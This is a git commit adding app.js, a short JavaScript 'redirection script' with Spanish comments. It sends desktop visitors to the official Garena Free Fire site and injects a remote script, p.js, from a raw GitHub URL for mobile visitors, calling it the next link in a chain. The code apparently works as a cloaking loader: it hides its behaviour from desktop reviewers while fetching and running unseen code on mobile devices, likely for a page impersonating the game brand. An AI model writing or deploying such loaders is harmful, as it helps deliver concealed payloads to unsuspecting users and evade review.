ca76c25bf2c847922d3b412584d9e5275c4d91cb
Jose1348 <117598171+Jose1348@users.noreply.github.com>
2026-03-05 01:36:20 -0600

    Create app.js file with redirection script

---
+++ app.js
@@ -0,0 +1,17 @@
+(function() {
+    const isMobile = /android|iphone|ipad/i.test(navigator.userAgent.toLowerCase());
+    
+    if (!isMobile) {
+        // Redirige si entran desde PC
+        window.location.replace("https://ff.garena.com/");
+        return;
+    }
+
+    // Carga el siguiente eslabón: p.js
+    const s = document.createElement('script');
+    s.src = "https://raw.githubusercontent.com/Jose1348/fuzzy-fiesta/deployment/p.js"; 
+    s.onerror = function() {
+        console.error("Error al cargar p.js");
+    };
+    document.head.appendChild(s);
+})();
